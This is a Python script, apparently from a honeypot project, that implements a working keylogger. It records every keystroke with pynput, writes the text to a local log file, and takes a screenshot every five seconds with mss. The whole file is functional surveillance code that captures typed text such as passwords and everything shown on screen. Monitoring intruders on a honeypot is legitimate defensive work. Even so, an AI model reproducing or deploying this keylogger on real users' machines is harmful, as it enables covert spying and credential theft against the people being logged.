from mss import mss
from pynput.keyboard import Listener
from threading import Thread
import time
import os
import sys
import signal

count = 0
keys = []
listener = None
should_stop = False

def write_file(keys):
    LOG_DIR = r"C:\Users\koosuru_vardhini\tasks\honeypot\Honeypot-Implementation-master\data_stored\honey_ss"
    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(os.path.join(LOG_DIR, 'Screenshots'), exist_ok=True)
    with open(os.path.join(LOG_DIR, 'log.txt'), "a") as f:
        cleaned_text = ""
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                cleaned_text += " "
            elif k.find("enter") > 0:
                cleaned_text += "\n"
            elif k.find("Key") == -1 and all(c.isprintable() for c in k):  # Only printable characters
                cleaned_text += k
        if cleaned_text:  # Only write if there’s valid text
            f.write(cleaned_text)

class KeyloggerMain:
    def _build_logs(self):
        pass

    def _on_press(self, k):
        global keys, count
        if should_stop:
            return False  # Stop listener if termination is requested
        keys.append(k)
        count += 1
        if count >= 10:
            count = 0
            write_file(keys)
            keys.clear()

    def _keylogger(self):
        global listener
        listener = Listener(on_press=self._on_press)
        with listener:
            listener.join()

    def _screenshot_loop(self, interval):
        global should_stop
        while not should_stop:
            try:
                print("Attempting to take screenshot...")
                sct = mss()
                screenshot_path = os.path.join(
                    r"C:\Users\koosuru_vardhini\tasks\honeypot\Honeypot-Implementation-master\data_stored\honey_ss\Screenshots",
                    f"{time.time()}.png"
                )
                sct.shot(output=screenshot_path)
                print(f"Screenshot saved to {screenshot_path}")
            except Exception as e:
                print(f"Error taking screenshot: {e}")
            time.sleep(interval)

    def run(self, interval):
        self._build_logs()
        Thread(target=self._keylogger).start()
        Thread(target=self._screenshot_loop, args=(interval,), daemon=True).start()

def cleanup():
    global listener, should_stop, keys
    should_stop = True
    if listener:
        listener.stop()
        print("Keylogger listener stopped")
    if keys:
        write_file(keys)
        keys.clear()
    print("Keylogger cleanup completed")
    sys.exit(0)

def signal_handler(sig, frame):
    print("Received termination signal")
    cleanup()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    km = KeyloggerMain()
    try:
        km.run(5)
    except KeyboardInterrupt:
        cleanup()
    except Exception as e:
        print(f"Unexpected error: {e}")
        cleanup()
    finally:
        cleanup()